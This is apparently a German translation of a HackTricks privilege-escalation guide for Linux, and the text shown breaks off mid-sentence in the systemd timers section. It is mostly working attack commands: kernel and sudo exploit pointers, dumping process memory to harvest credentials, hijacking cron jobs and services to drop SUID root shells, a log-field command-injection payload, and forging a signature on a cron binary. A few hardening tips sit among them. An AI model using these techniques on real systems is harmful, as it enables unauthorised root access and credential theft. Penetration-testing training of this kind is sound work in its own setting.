# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Informationen

Beginnen wir damit, Informationen über das laufende OS zu sammeln
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pfad

Wenn Sie **Schreibrechte für einen Ordner innerhalb der `PATH`-Variable** haben, können Sie möglicherweise einige libraries oder binaries hijacken:
```bash
echo $PATH
```
### Umgebungsinformationen

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Prüfe die Kernel-Version und mögliche exploits, die escalate privileges ermöglichen.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Du findest eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **compiled exploits** findest: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Website zu extrahieren, kannst du:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach Kernel-Exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Suche immer **die Kernel-Version in Google**, vielleicht ist deine Kernel-Version in einem Kernel-Exploit erwähnt und dann kannst du sicher sein, dass dieser Exploit gültig ist.

Weitere kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo Version

Basierend auf den verwundbaren sudo-Versionen, die in:
```bash
searchsploit sudo
```
Sie können prüfen, ob Ihre sudo-Version anfällig ist, indem Sie dieses grep verwenden.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) erlauben nicht-privilegierten lokalen Benutzern, ihre Rechte auf root zu eskalieren über die sudo-Option `--chroot`, wenn die Datei `/etc/nsswitch.conf` aus einem vom Benutzer kontrollierten Verzeichnis verwendet wird.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Bevor Sie den Exploit ausführen, stellen Sie sicher, dass Ihre `sudo`-Version verwundbar ist und das `chroot`-Feature unterstützt.

Für weitere Informationen siehe die originale [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Siehe **smasher2 box of HTB** für ein **Beispiel**, wie diese Schwachstelle ausgenutzt werden kann
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mehr system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Abwehrmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Wenn du dich in einem container befindest, beginne mit dem folgenden container-security-Abschnitt und pivot dann zu den runtime-spezifischen abuse-Seiten:


{{#ref}}
container-security/
{{#endref}}

## Laufwerke

Prüfe **was gemountet und ungemountet ist**, wo und warum. Falls etwas ungemountet ist, könntest du versuchen, es zu mounten und nach sensiblen Daten zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **irgendein Compiler installiert ist**. Das ist nützlich, falls du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn einsetzen willst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Installierte anfällige Software

Prüfe die **Version der installierten Pakete und Dienste**. Möglicherweise gibt es eine alte Nagios-Version (zum Beispiel), die ausgenutzt werden könnte, um escalating privileges zu erreichen…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn Sie SSH-Zugriff auf die Maschine haben, können Sie auch **openVAS** verwenden, um nach veralteter und verwundbarer Software zu suchen, die auf der Maschine installiert ist.

> [!NOTE] > _Beachten Sie, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sind; daher empfiehlt sich die Verwendung von Anwendungen wie OpenVAS oder ähnlichen, die prüfen, ob eine installierte Softwareversion für bekannte exploits verwundbar ist_

## Prozesse

Werfen Sie einen Blick darauf, **welche Prozesse** ausgeführt werden, und prüfen Sie, ob ein Prozess **mehr Rechte hat, als er sollte** (vielleicht ein tomcat, der als root ausgeführt wird?).
```bash
ps aux
ps -ef
top -n 1
```
Prüfe immer, ob [**electron/cef/chromium debuggers** laufen — du könntest sie missbrauchen, um Privilegien zu eskalieren](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect`-Parameter in der Kommandozeile des Prozesses prüft.\
Prüfe außerdem **deine Berechtigungen auf die Binaries der Prozesse** — vielleicht kannst du eines überschreiben.

### Cross-user Parent-Child-Ketten

Ein Child-Prozess, der unter einem **anderen Benutzer** als sein Parent läuft, ist nicht automatisch bösartig, aber es ist ein nützliches **Triage-Signal**. Manche Übergänge sind erwartbar (`root`, der einen Service-User startet; Login-Manager, die Session-Prozesse erstellen), aber ungewöhnliche Ketten können Wrapper, Debug-Hilfen, Persistenz oder schwache Laufzeit-Vertrauensgrenzen offenbaren.

Kurze Übersicht:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Wenn Sie auf eine überraschende Kette stoßen, prüfen Sie die übergeordnete Befehlszeile und alle Dateien, die ihr Verhalten beeinflussen (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). In mehreren realen privesc-Pfaden war das Kind selbst nicht beschreibbar, aber die **vom übergeordneten Prozess kontrollierte config** oder die helper chain waren es.

### Gelöschte Executables und gelöschte, noch geöffnete Dateien

Laufzeit-Artefakte sind oft noch **nach dem Löschen** zugänglich. Das ist sowohl für privilege escalation als auch zum Wiederherstellen von Beweismitteln aus einem Prozess nützlich, der bereits sensible Dateien geöffnet hat.

Check for deleted executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Wenn `/proc/<PID>/exe` auf `(deleted)` zeigt, läuft der Prozess weiterhin das alte Binärabbild aus dem Speicher. Das ist ein starkes Indiz, das eine Untersuchung rechtfertigt, weil:

- die entfernte ausführbare Datei interessante Strings oder Anmeldeinformationen enthalten kann
- der laufende Prozess möglicherweise weiterhin nützliche Dateideskriptoren offenlegt
- ein gelöschtes privilegiertes Binary auf kürzliche Manipulation oder versuchte Aufräumaktionen hinweisen kann

Gelöschte, geöffnete Dateien global sammeln:
```bash
lsof +L1
```
Wenn du einen interessanten Deskriptor findest, stelle ihn sofort wieder her:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Das ist besonders wertvoll, wenn ein Prozess noch ein gelöschtes secret, script, database export oder flag file geöffnet hat.

### Prozessüberwachung

Sie können Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Anforderungen erfüllt sind.

### Prozessspeicher

Einige Services eines Servers speichern **credentials im Klartext im Speicher**.\
Normalerweise benötigen Sie **root privileges**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören; daher ist dies in der Regel nützlicher, wenn Sie bereits root sind und weitere credentials entdecken möchten.\
Denken Sie jedoch daran, dass **Sie als normaler Benutzer den Speicher der Prozesse, die Ihnen gehören, lesen können**.

> [!WARNING]
> Beachten Sie, dass die meisten Maschinen heutzutage **ptrace standardmäßig nicht erlauben**, was bedeutet, dass Sie andere Prozesse, die Ihrem unprivilegierten Benutzer gehören, nicht dumpen können.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle Prozesse können debuggt werden, solange sie die gleiche uid haben. Dies ist die klassische Funktionsweise von ptracing.
> - **kernel.yama.ptrace_scope = 1**: nur ein Parent-Prozess kann debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Wenn Sie Zugriff auf den Speicher eines FTP-Services (zum Beispiel) haben, könnten Sie den Heap auslesen und darin nach credentials suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen **maps, wie der Speicher innerhalb des virtuellen Adressraums dieses Prozesses abgebildet ist**; sie zeigt auch die **Berechtigungen jeder abgebildeten Region**. Die Pseudo-Datei **mem** **legt den Speicher des Prozesses selbst offen**. Aus der **maps**-Datei wissen wir, welche **Speicherbereiche lesbar sind** und deren Offsets. Wir verwenden diese Informationen, um **in die mem file zu seeken und alle lesbaren Bereiche in eine Datei zu dumpen**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann über /dev/kmem zugegriffen werden.\  
Typischerweise ist `/dev/mem` nur für **root** und die Gruppe **kmem** lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine für Linux neu konzipierte Version des klassischen ProcDump-Tools aus der Sysinternals-Tool-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses zu dumpen, können Sie verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können manuell die root-Rechte entfernen und den Prozess dumpen, der Ihnen gehört
- Script A.5 aus [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Zugangsdaten aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den process dumpen (siehe vorherige Abschnitte, um verschiedene Wege zu finden, die memory eines process zu dumpen) und im memory nach credentials suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) stiehlt **Klartext-Anmeldedaten aus dem Speicher** und aus einigen **bekannten Dateien**. Es benötigt Root-Rechte, um richtig zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP Basic-Auth-Sessions)         | apache2              |
| OpenSSH (aktive SSH-Sitzungen - Sudo-Nutzung)     | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) läuft als root – webbasierter Scheduler privesc

Wenn ein Web-„Crontab UI“-Panel (alseambusher/crontab-ui) als root läuft und nur an loopback gebunden ist, kannst du es trotzdem über SSH local port-forwarding erreichen und einen privilegierten Job erstellen, um dich zu erhöhen.

Typische Kette
- Entdecke einen nur auf Loopback gebundenen Port (z. B. 127.0.0.1:8000) und das Basic-Auth-Realm via `ss -ntlp` / `curl -v localhost:8000`
- Finde Anmeldedaten in operationalen Artefakten:
- Backups/Skripte mit `zip -P <password>`
- systemd-Unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` offenlegt
- Tunnel und Login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen hochprivilegierten Job und führe ihn sofort aus (legt eine SUID shell ab):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Verwende es:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Führe Crontab UI nicht als root aus; beschränke es auf einen dedizierten Benutzer mit minimalen Berechtigungen
- Binde an localhost und beschränke zusätzlich den Zugriff per firewall/VPN; verwende keine wiederverwendeten Passwörter
- Vermeide das Einbetten von secrets in unit files; nutze secret stores oder eine root-only EnvironmentFile
- Aktiviere audit/logging für on-demand job executions



Prüfe, ob ein scheduled job verwundbar ist. Möglicherweise kannst du ausnutzen, dass ein script als root ausgeführt wird (wildcard vuln? Kannst du Dateien ändern, die root verwendet? symlinks nutzen? bestimmte Dateien in dem von root genutzten Verzeichnis erstellen?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Wenn `run-parts` verwendet wird, prüfe, welche Namen tatsächlich ausgeführt werden:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Das vermeidet false positives. Ein beschreibbares periodic-Verzeichnis ist nur nützlich, wenn der Dateiname deiner payload den lokalen `run-parts`-Regeln entspricht.

### Cron-Pfad

Zum Beispiel innerhalb von _/etc/crontab_ findest du den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte auf /home/user hat_)

Wenn in dieser crontab der root-Benutzer versucht, einen Befehl oder ein Skript auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root shell erhalten, indem du Folgendes verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Wenn ein script von root ausgeführt wird und ein “**\***” in einem command vorkommt, kannst du das ausnutzen, um unerwartete Dinge zu bewirken (z. B. privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn der wildcard einem Pfad wie** _**/some/path/\***_ **vorangestellt ist, ist er nicht verwundbar (selbst** _**./\***_ **nicht).**

Lies die folgende Seite für mehr wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt parameter expansion und command substitution vor der arithmetischen Auswertung in ((...)), $((...)) und let aus. Wenn ein root cron/parser nicht vertrauenswürdige Log-Felder liest und in einen arithmetischen Kontext einspeist, kann ein Angreifer eine command substitution $(...) injizieren, die beim Ausführen des cron als root ausgeführt wird.

- Warum das funktioniert: In Bash erfolgen die Expansionen in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird also zuerst substituiert (der Befehl läuft), danach wird die verbleibende numerische `0` für die Arithmetik verwendet, sodass das Script ohne Fehler weiterläuft.

- Typisches verwundbares Muster:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Sorge dafür, dass vom Angreifer kontrollierter Text in das geparste Log geschrieben wird, sodass das numerisch aussehende Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout schreibt (oder leite es um), damit die Arithmetik gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Wenn du ein **cron script**, das als root ausgeführt wird, verändern kannst, kannst du sehr leicht eine Shell bekommen:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das vom root ausgeführte script ein **directory, auf das du vollen Zugriff hast** verwendet, könnte es nützlich sein, diesen Ordner zu löschen und einen **symlink-Ordner auf ein anderes Verzeichnis zu erstellen**, der ein von dir kontrolliertes script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink-Validierung und sicherere Dateibehandlung

Beim Prüfen privilegierter Skripte/Binaries, die Dateien per Pfad lesen oder schreiben, prüfen Sie, wie Links gehandhabt werden:

- `stat()` folgt einem symlink und gibt die Metadaten des Ziels zurück.
- `lstat()` gibt die Metadaten des Links selbst zurück.
- `readlink -f` und `namei -l` helfen, das endgültige Ziel aufzulösen und die Berechtigungen jedes Pfadbestandteils anzuzeigen.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Für Verteidiger/Entwickler sind sicherere Muster gegen symlink-Tricks:

- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
- `openat()`: operate relative to a trusted directory file descriptor.
- `mkstemp()`: create temporary files atomically with secure permissions.

### Custom-signierte cron-Binaries mit beschreibbaren Payloads
Blue teams signieren manchmal cron-getriebene Binaries, indem sie eine benutzerdefinierte ELF-Sektion dumpen und nach einem Vendor-String mit grep suchen, bevor sie sie als root ausführen. Wenn dieses Binary für die Gruppe schreibbar ist (z. B. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) und Sie Zugriff auf das Signaturmaterial erlangen, können Sie die Sektion fälschen und den cron-Task hijacken:

1. Verwende `pspy`, um den Verifizierungsablauf zu erfassen. In Era führte root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` gefolgt von `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` aus und führte dann die Datei aus.
2. Erstelle das erwartete Zertifikat neu mit dem Schlüssel/der Konfig aus `signing.zip`:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Baue einen bösartigen Ersatz (z. B. eine SUID bash ablegen, deinen SSH-Schlüssel hinzufügen) und bette das Zertifikat in `.text_sig` ein, sodass das grep besteht:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Überschreibe das geplante Binary und erhalte dabei die Ausführungsbits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Warte auf den nächsten cron-Lauf; sobald die naive Signaturprüfung besteht, läuft dein Payload als root.

### Häufige cron-Jobs

Du kannst Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht lässt sich das ausnutzen, um Privilegien zu eskalieren.

Zum Beispiel, um **every 0.1s during 1 minute** zu überwachen, **nach am wenigsten ausgeführten Kommandos zu sortieren** und die Kommandos zu löschen, die am häufigsten ausgeführt wurden, kannst du Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Sie können auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies überwacht und listet jeden gestarteten Prozess).

### Root-Backups, die vom Angreifer gesetzte Berechtigungsbits erhalten (pg_basebackup)

Wenn ein von root ausgeführter cron `pg_basebackup` (oder ein beliebiger rekursiver Kopiervorgang) auf ein Datenbankverzeichnis zugreift, in das Sie schreiben können, können Sie eine **SUID/SGID binary** platzieren, die mit denselben Berechtigungsbits als **root:root** in die Backup-Ausgabe zurückkopiert wird.

Typischer Ablauf zur Entdeckung (als DB-User mit geringen Rechten):
- Verwende `pspy`, um einen root-cron zu finden, der ungefähr jede Minute etwas wie `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` aufruft.
- Bestätige, dass das Quell-Cluster (z. B. `/var/lib/postgresql/14/main`) von dir beschreibbar ist und dass das Ziel (`/opt/backups/current`) nach dem Job root gehört.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Das funktioniert, weil `pg_basebackup` die Dateiberechtigungsbits beim Kopieren des Clusters beibehält; wenn es von root aufgerufen wird, erben die Zieldateien **root ownership + attacker-chosen SUID/SGID**. Jede ähnliche privilegierte Backup-/Kopierroutine, die Berechtigungen erhält und in einen ausführbaren Pfad schreibt, ist anfällig.

### Unsichtbare cron-Jobs

Es ist möglich, einen cronjob zu erstellen, indem man **einen carriage return nach einem Kommentar setzt** (ohne newline character), und der cronjob funktioniert. Beispiel (achte auf das carriage return-Zeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Um diese Art von verdecktem Eintrag zu erkennen, untersuche cron files mit Tools, die Steuerzeichen sichtbar machen:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Dienste

### Schreibbare _.service_ Dateien

Prüfe, ob du irgendeine `.service`-Datei schreiben kannst; wenn ja, **kannst du sie ändern**, sodass sie **deine Backdoor ausführt**, wenn der Service **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht musst du bis zum nächsten Reboot warten).\
Zum Beispiel erstelle deine Backdoor innerhalb der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Schreibbare Service-Binaries

Beachte, dass wenn du **Schreibrechte auf Binaries hast, die von Services ausgeführt werden**, du diese verändern kannst, um Backdoors einzuschleusen, sodass beim erneuten Ausführen der Services die Backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH sehen mit:
```bash
systemctl show-environment
```
Wenn Sie feststellen, dass Sie in einem der Ordner des Pfads **write** können, könnten Sie möglicherweise **escalate privileges**. Sie sollten nach Dateien suchen, in denen **relative paths being used on service configurations** verwendet werden, wie zum Beispiel:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann eine **ausführbare Datei** mit exakt demselben Namen wie das Binary im relativen Pfad innerhalb des systemd PATH-Ordners, in den du schreiben kannst. Wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird deine **backdoor ausgeführt** (nicht-privilegierte Benutzer können normalerweise keine Dienste starten/stoppen; prüfe jedoch, ob du `sudo -l` verwenden kannst).

**Erfahre mehr über Dienste mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd-Unit-Dateien, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für Kalenderzeit-Ereignisse und monotone Zeit-Ereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Beschreibbare Timer

Wenn du einen Timer modifizieren kannst, kannst du ihn dazu bringen, einige vorhandene systemd.unit-Einheiten auszuführen (wie `.service` oder `.target`).
```bash
Unit=backdoor.service
```
In der Dokumentation kannst du lesen, was die Unit ist:

